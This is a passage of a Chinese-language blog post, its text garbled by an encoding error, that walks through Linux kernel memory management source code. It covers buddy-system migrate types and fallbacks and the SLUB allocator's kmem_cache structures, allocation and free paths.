class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿ç§»ç±»å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<span class="hljs-comment">// ä¸å¯è¿ç§»</span><br>MIGRATE_MOVABLE,<span class="hljs-comment">// å¯è¿ç§»</span><br>MIGRATE_RECLAIMABLE,<span class="hljs-comment">// å¯å›æ”¶</span><br>MIGRATE_PCPTYPES,<span class="hljs-comment">// å±äºé«˜é€Ÿç¼“å­˜ï¼ˆper_cpu_pagesetï¼‰</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,  <span class="hljs-comment">// ç´§æ€¥å†…å­˜</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br>MIGRATE_CMA,<span class="hljs-comment">// é¢„ç•™çš„è¿ç»­å†…å­˜CMA</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">// can&#x27;t allocate from here</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<span class="hljs-comment">// è¿ç§»ç±»å‹æ•°é‡</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>UNMOVABLEï¼šä¸€èˆ¬ä½äºç›´æ¥æ˜ å°„åŒºï¼Œå†…æ ¸æ‰€éœ€è¦çš„æ ¸å¿ƒå†…å­˜ä¸€èˆ¬ä»è¿™åˆ†é…</li><li>MOVABLEï¼šä¸€èˆ¬ç”¨äºåœ¨è¿›ç¨‹ç”¨æˆ·ç©ºé—´ä¸­åˆ†é…ï¼Œå› ä¸ºåœ¨ç”¨æˆ·ç©ºé—´ä¸­è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜éƒ½æ˜¯é€šè¿‡é¡µè¡¨æ¥åŠ¨æ€æ˜ å°„çš„ï¼Œç‰©ç†é¡µç§»åŠ¨ä¹‹åï¼Œåªéœ€è¦æ”¹å˜é¡µè¡¨ä¸­çš„æ˜ å°„å…³ç³»å³å¯ï¼Œè€Œè™šæ‹Ÿå†…å­˜åœ°å€å¹¶ä¸éœ€è¦æ”¹å˜</li><li>PCPTYPESï¼šé‡Œé¢åŒ…å«äº†é«˜é€Ÿç¼“å­˜ä¸­çš„å†·é¡µå’Œçƒ­é¡µ</li><li>RECLAIMABLEï¼šä¸èƒ½ç§»åŠ¨ä½†å¯ä»¥å›æ”¶ï¼Œæ¯”å¦‚æ–‡ä»¶ç¼“å­˜é¡µï¼Œä¹‹åå†ä»æ–‡ä»¶ä¸­è¯»å–å°±è¡Œ</li><li>CMAï¼šcontiguous memory allocatorï¼Œæ˜¯ä¸€ä¸ªåˆ†é…è¿ç»­ç‰©ç†å†…å­˜é¡µé¢çš„åˆ†é…å™¨ï¼Œç”¨äºåˆ†é…è¿ç»­çš„ç‰©ç†å†…å­˜</li><li>ISOLATEï¼šä¸€ä¸ªè™šæ‹ŸåŒºåŸŸï¼Œç”¨äºè·¨è¶ŠNUMAèŠ‚ç‚¹ç§»åŠ¨ç‰©ç†å†…å­˜é¡µï¼Œå†…æ ¸å¯ä»¥å°†ç‰©ç†å†…å­˜é¡µç§»åŠ¨åˆ°ä½¿ç”¨è¯¥é¡µæœ€é¢‘ç¹çš„CPU æ‰€åœ¨çš„NUMAèŠ‚ç‚¹ä¸­</li></ul><p>é•¿è¿™æ ·</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/buddy.png" class title="buddy"><p>å¦‚æœå¯¹åº”orderï¼Œmigratetypeçš„pageä¸å¤Ÿï¼Œä»å…¶ä»–migratetypeä¸­ç”³è¯·çš„é¡ºåºï¼Œæ³¨æ„fallbacksåˆ†é…çš„é¡ºåºå’Œæ­£å¸¸åˆ†é…çš„é¡ºåºæ˜¯åçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> fallbacks[MIGRATE_TYPES][<span class="hljs-number">3</span>] = &#123;<br>[MIGRATE_UNMOVABLE]   = &#123; MIGRATE_RECLAIMABLE, MIGRATE_MOVABLE,   MIGRATE_TYPES &#125;,<br>[MIGRATE_MOVABLE]     = &#123; MIGRATE_RECLAIMABLE, MIGRATE_UNMOVABLE, MIGRATE_TYPES &#125;,<br>[MIGRATE_RECLAIMABLE] = &#123; MIGRATE_UNMOVABLE,   MIGRATE_MOVABLE,   MIGRATE_TYPES &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ”¾ä¸€å¼ get_page_from_freelistå‡½æ•°çš„é€»è¾‘</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/freelist.png" class title="freelist"><ul><li>for_next_zone_zonelist_nodemaskéå†<strong>å½“å‰NUMAèŠ‚ç‚¹ä»¥åŠå¤‡ç”¨èŠ‚ç‚¹çš„æ‰€æœ‰zoneï¼ˆzonelistï¼‰</strong></li><li>zone_watermark_fastæ£€æŸ¥zoneä¸­çš„å‰©ä½™å†…å­˜æ˜¯å¦åœ¨æŒ‡å®šæ°´ä½çº¿ä¸Šï¼Œæ˜¯åˆ™è·³è½¬è‡³try_this_zoneè°ƒç”¨rmqueueè¿›å…¥buddy systemè¿›è¡Œå†…å­˜åˆ†é…ï¼Œåˆ†é…æˆåŠŸåè°ƒç”¨prep_new_pageåˆå§‹åŒ–åˆ†é…å¥½çš„pageï¼Œå¦åˆ™ç»§ç»­</li><li>node_reclaimè§¦å‘å†…å­˜å›æ”¶ï¼Œå›æ”¶åé€šè¿‡zone_watermark_okæ£€æŸ¥å›æ”¶çš„å†…å­˜æ˜¯å¦æ»¡è¶³æœ¬æ¬¡åˆ†é…éœ€è¦ï¼Œæ˜¯åˆ™è·³è½¬è‡³try_this_zoneåœ¨zoneä¸­åˆ†é…å†…å­˜</li></ul><p>rmqueueåŒ…æ‹¬äº†buddy systemçš„ä¸»é€»è¾‘</p><ul><li>__rmqueue_smallestå°è£…buddy systemçš„æ ¸å¿ƒæµç¨‹</li><li>__rmqueueåº•å±‚è°ƒç”¨__rmqueue_smallestï¼Œè¿˜åŒ…æ‹¬fallbackçš„è¿‡ç¨‹</li></ul><p>ä¸€æ¬¡åˆ†é…çš„æµç¨‹å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/alloc3-0.png" class title="alloc3-0"><p>å†…å­˜é‡Šæ”¾æºç é€»è¾‘</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/freepages.png" class title="freepages"><p>é¡µç‰©ç†è§†å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E7%89%A9%E7%90%86.png" class title="ç‰©ç†"><p>ä¸€æ¬¡é‡Šæ”¾çš„è¿‡ç¨‹</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E9%87%8A%E6%94%BE.png" class title="é‡Šæ”¾"><h1 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h1><p>å†…æ ¸ç‰ˆæœ¬5.4ï¼Œslub</p><h2 id="slabæ•°æ®ç»“æ„ä½“"><a href="#slabæ•°æ®ç»“æ„ä½“" class="headerlink" title="slabæ•°æ®ç»“æ„ä½“"></a>slabæ•°æ®ç»“æ„ä½“</h2><p>slabç»“æ„å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/slab.jpg" class title="slab"><ul><li><p>kmem_cacheç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-comment">/* Used for retrieving partial slabs, etc. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* The size of an object including metadata */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* The size of an object without metadata */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* Free pointer offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* Allocation and freeing of slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">max</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* gfp flags to use on each alloc */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* Refcount for slab cache destroy */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* Offset to metadata */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* Alignment */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* List of slab caches */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* Usercopy region offset */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* Usercopy region size */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>flagsï¼šç®¡ç†æ ‡å¿—ä½</p><ul><li><p>SLAB_HWCACHE_ALIGNï¼šéœ€è¦è¿›è¡Œcache lineï¼ˆ64ä½ï¼‰å¯¹é½</p></li><li><p>SLAB_POISONï¼šéœ€è¦å¡«å……ç‰¹æ®Šå­—èŠ‚è¡¨ç¤ºçŠ¶æ€</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/poison.jpg" class title="poison"></li><li><p>SLAB_RED_ZONEï¼šéœ€è¦æ’å…¥red zoneé˜²æ­¢è¶Šç•Œè¯»å†™</p></li><li><p>SLAB_CACHE_DMAï¼šslabä¸­å†…å­˜æ¥è‡ªå“ªä¸ªå†…å­˜åŒºåŸŸ</p></li><li><p>SLAB_STORE_USERï¼šè¿½è¸ªå¯¹è±¡çš„åˆ†é…é‡Šæ”¾ä¿¡æ¯ï¼Œè¿½åŠ ä¸¤ä¸ªtrackå—</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/track.jpg" class title="track"></li></ul></li><li><p>sizeï¼šslabå¯¹è±¡çœŸå®å¤§å°</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/size.jpg" class title="size"></li><li><p>object_sizeï¼šä½¿ç”¨çš„å†…å­˜å¤§å°ï¼ˆä¸Šå›¾object sizeè“è‰²éƒ¨åˆ†ï¼‰</p></li><li><p>offsetï¼šfreepointerçš„åç§»</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/freepointer.jpg" class title="freepointer"></li><li><p>ooï¼šå‚¨å­˜slabéœ€è¦çš„pageä¸ªæ•°</p></li><li><p>maxï¼šooçš„æœ€å¤§å€¼ï¼Œåˆå§‹åŒ–ä¸ºoo</p></li><li><p>minï¼šooçš„æœ€å°å€¼ï¼Œåˆå§‹åŒ–ä¸º1</p></li><li><p>allocflagsï¼šåˆ†é…æ—¶æ‰€ç”¨çš„æ ‡å¿—ä½</p></li><li><p>inuseï¼šword sizeå¯¹é½åçš„å¤§å°</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/inuse.jpg" class title="inuse"></li><li><p>alignï¼šç»¼åˆword sizeï¼Œcache lineï¼Œalignè®¡ç®—ä¸€ä¸ªåˆç†çš„å¯¹é½å°ºå¯¸</p></li><li><p>nameï¼šslab cacheçš„åç§°</p></li><li><p>refcountï¼šå¼•ç”¨è®¡æ•°</p></li><li><p>listï¼škmem_cacheç”¨åŒå‘é“¾è¡¨ä¸²è”</p></li><li><p>cpu_slabï¼šæ¯ä¸ªcpuæœ‰ä¸€ä¸ªslabæœ¬åœ°ç¼“å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* Pointer to next available object */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><span class="hljs-comment">/* The slab from which we are allocating */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>freelistï¼šè¯¥slabç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡</li><li>tidï¼šcpuç¼–å·</li><li>pageï¼šslabæ‰€åœ¨çš„page</li><li>partialï¼šå¤‡ç”¨çš„slab</li></ul></li><li><p>nodeï¼šå¤‡ç”¨slabï¼ˆæ¯ä¸ªNUMAèŠ‚ç‚¹ä¸€ä¸ªï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>nr_patialï¼šè¯¥NUMAèŠ‚ç‚¹å¤‡ç”¨slabä¸ªæ•°</li><li>patialï¼šå¤‡ç”¨slabç”¨ä¸€ä¸ªpatialåŒé“¾è¡¨ä¸²è”èµ·æ¥</li><li>fullï¼šä¸²è”æ‰€æœ‰åˆ†é…å®Œçš„slab</li></ul></li></ul></li><li><p>pageç»“æ„ä½“ä¸­slabç›¸å…³æˆå‘˜ï¼ˆé«˜ç‰ˆæœ¬å¦æœ‰slabç»“æ„ä½“ï¼‰ï¼Œä¸€ä¸ªpageæ˜¯ä¸€ä¸ªslab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* slab, slob and slub */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* Partial pages */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br><span class="hljs-type">int</span> pages;<span class="hljs-comment">/* Nr of pages left */</span><br><span class="hljs-type">int</span> pobjects;<span class="hljs-comment">/* Approximate count */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">short</span> <span class="hljs-type">int</span> pages;<br><span class="hljs-type">short</span> <span class="hljs-type">int</span> pobjects;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span> <span class="hljs-comment">/* not slob */</span><br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* first free object */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">void</span> *s_mem;<span class="hljs-comment">/* slab: first object */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<span class="hljs-comment">/* SLUB */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* SLUB */</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>slab_listï¼šslabæ‰€åœ¨ç®¡ç†é“¾è¡¨</li><li>nextï¼špartialä½¿ç”¨</li><li>pagesï¼šslabæ‰€åœ¨ç®¡ç†é“¾è¡¨ä¸­çš„åŒ…å«çš„slabæ€»æ•°</li><li>pobjectsï¼šslabæ‰€åœ¨ç®¡ç†é“¾è¡¨ä¸­åŒ…å«çš„å¯¹è±¡æ€»æ•°</li><li>slab_cacheï¼šæŒ‡å‘kmem_cache</li><li>freelistï¼šæŒ‡å‘slabä¸­ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼Œslabæ”¾è¿›cpu_slabåå°†è¿™ä¸ªæŒ‡é’ˆèµ‹ç»™cpu_slabï¼Œç„¶åç½®ç©º</li><li>inuseï¼šä½¿ç”¨çš„ç©ºé—´</li><li>objectsï¼šåŒ…å«çš„å¯¹è±¡ä¸ªæ•°</li><li>frozenï¼š1è¡¨ç¤ºåœ¨æœ¬åœ°cpuç¼“å­˜ä¸­</li></ul></li></ul><h2 id="åˆ†é…é€»è¾‘"><a href="#åˆ†é…é€»è¾‘" class="headerlink" title="åˆ†é…é€»è¾‘"></a>åˆ†é…é€»è¾‘</h2><ul><li><p>ä»æœ¬åœ°cpuç¼“å­˜ä¸­åˆ†é…ï¼ˆfast pathï¼‰ï¼šæŸ¥çœ‹freelistæ˜¯å¦æœ‰ç©ºé—²å¯¹è±¡</p></li><li><p>ä»æœ¬åœ°cpuç¼“å­˜partialåˆ—è¡¨ä¸­åˆ†é…ï¼šæœ¬åœ°cpuç¼“å­˜çš„slabï¼ˆpageï¼‰ä¸­æ²¡æœ‰ç©ºé—²å¯¹è±¡</p><ul><li>éå†partialåˆ—è¡¨ï¼Œæ‰¾ä¸€ä¸ªæ»¡è¶³åˆ†é…çš„slab</li><li>å°†è¿™ä¸ªslabä»partialä¸­æ‘˜ä¸‹ï¼Œæå‡ä¸ºæœ¬åœ°cpuç¼“å­˜</li></ul></li><li><p>ä»NUMAèŠ‚ç‚¹ç¼“å­˜ä¸­åˆ†é…ï¼šéå†kmem_cache_node-&gt;partialåˆ—è¡¨ï¼Œå°†é“¾è¡¨ä¸­çš„slabæ‘˜ä¸‹æ¥å¡«å……åˆ°æœ¬åœ°cpuç¼“å­˜çš„partialé“¾è¡¨ä¸­ï¼ˆæœ€å¤šcpu_partial &#x2F; 2ä¸ªï¼‰</p></li><li><p>ä»buddy systemä¸­é‡æ–°ç”³è¯·slabï¼šæœ€å¼€å§‹slabæ˜¯ç©ºçš„</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E7%A9%BAslab.jpg" class title="ç©ºslab"><p>åˆå§‹åŒ–æ–°ç”³è¯·çš„slabï¼Œæå‡ä¸ºcpuæœ¬åœ°ç¼“å­˜çš„page</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/newslab.jpg" class title="newslab"></li></ul><p>å‡½æ•°è°ƒç”¨å…³ç³»å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/alloc.jpg" class title="alloc111"><h2 id="é‡Šæ”¾é€»è¾‘"><a href="#é‡Šæ”¾é€»è¾‘" class="headerlink" title="é‡Šæ”¾é€»è¾‘"></a>é‡Šæ”¾é€»è¾‘</h2><ul><li>é‡Šæ”¾å¯¹è±¡æ‰€å±slabåœ¨cpuæœ¬åœ°ç¼“å­˜ä¸­ï¼ˆfast pathï¼‰ï¼šç›´æ¥æ”¾å›cpuæœ¬åœ°ç¼“å­˜çš„slab</li><li>é‡Šæ”¾å¯¹è±¡æ‰€å±slabåœ¨cpuæœ¬åœ°ç¼“å­˜partialé“¾è¡¨ä¸­ï¼šç›´æ¥é‡Šæ”¾</li><li>é‡Šæ”¾å¯¹è±¡æ‰€å±slabä»fullå˜æˆpartialï¼ˆslabä¸åœ¨cpuæœ¬åœ°ç¼“å­˜ä¸­ï¼‰<ul><li>å¯¹è±¡æ”¾å›slabå¹¶å°†slabæ”¾å…¥æœ¬åœ°cpuç¼“å­˜çš„partialé“¾è¡¨ä¸­ï¼ˆpartialä¸­slabä¸ªæ•°æœªè¶…æ ‡ï¼‰</li><li>å°†partialé“¾è¡¨ä¸­çš„æ‰€æœ‰slabè½¬ç§»è‡³å¯¹åº”NUMAèŠ‚ç‚¹çš„node-&gt;partialé“¾è¡¨çš„å°¾éƒ¨ï¼Œå†å°†slabæ’å…¥æœ¬åœ°ç¼“å­˜çš„partialé“¾è¡¨ï¼ˆpartialä¸­slabä¸ªæ•°è¶…æ ‡ï¼‰</li></ul></li><li>é‡Šæ”¾å¯¹è±¡æ‰€å±slabä»partialå˜æˆempty<ul><li>ä¸æ˜¯æ´»è·ƒslabï¼Œæ”¾å›kmem_cache_node-&gt;partialé“¾è¡¨ï¼ˆpartialä¸­slabä¸ªæ•°æœªè¶…æ ‡ï¼Œmin_partialï¼‰</li><li>æ”¾å›buddy systemï¼ˆpartialä¸­slabä¸ªæ•°è¶…æ ‡ï¼‰</li></ul></li></ul><p>å‡½æ•°è°ƒç”¨å…³ç³»å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/free.jpg" class title="free111"><h2 id="slabå†…å­˜æ± çš„åˆ›å»ºåˆå§‹åŒ–æµç¨‹"><a href="#slabå†…å­˜æ± çš„åˆ›å»ºåˆå§‹åŒ–æµç¨‹" class="headerlink" title="slabå†…å­˜æ± çš„åˆ›å»ºåˆå§‹åŒ–æµç¨‹"></a>slabå†…å­˜æ± çš„åˆ›å»ºåˆå§‹åŒ–æµç¨‹</h2><p>å°±æ”¾ä¸€å¼ å‡½æ•°è°ƒç”¨å…³ç³»å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/create.jpg" class title="create"><h2 id="slabå†…å­˜æ± çš„é”€æ¯"><a href="#slabå†…å­˜æ± çš„é”€æ¯" class="headerlink" title="slabå†…å­˜æ± çš„é”€æ¯"></a>slabå†…å­˜æ± çš„é”€æ¯</h2><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/destroy.jpg" class title="destroy"><h2 id="kmallocä½“ç³»"><a href="#kmallocä½“ç³»" class="headerlink" title="kmallocä½“ç³»"></a>kmallocä½“ç³»</h2><p>kmallocä½“ç³»åŸºäºslab allocatorä½“ç³»ï¼Œæœ¬è´¨æ˜¯ä¸åŒå°ºå¯¸çš„é€šç”¨slab cache</p><h3 id="kmallocå†…å­˜å—å°ºå¯¸"><a href="#kmallocå†…å­˜å—å°ºå¯¸" class="headerlink" title="kmallocå†…å­˜å—å°ºå¯¸"></a>kmallocå†…å­˜å—å°ºå¯¸</h3><p>slab cacheä¿¡æ¯å‚¨å­˜åœ¨kmalloc_infoæ•°ç»„ä¸­ï¼Œç”±kmalloc_info_structç»“æ„ä½“è¡¨ç¤º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>&#125; 